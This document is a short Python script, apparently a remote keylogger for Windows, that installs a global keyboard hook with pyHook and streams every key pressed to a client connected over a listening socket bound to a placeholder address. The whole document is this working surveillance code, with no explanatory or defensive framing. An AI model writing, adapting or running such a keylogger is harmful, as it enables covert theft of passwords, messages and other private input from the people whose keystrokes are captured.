import pyHook, pythoncom, socket

server = socket.socket()
server.bind(("XXX.XXX.XXX.XXX", XXXX))
server.listen(1)
c, a = server.accept()

def onKeyboardEvent(e):
    c.send(str(e.GetKey()).encode())
    return 1

hm = pyHook.HookManager()
hm.SubscribeKeyDown(onKeyboardEvent)
hm.HookKeyboard()

pythoncom.PumpMessages()

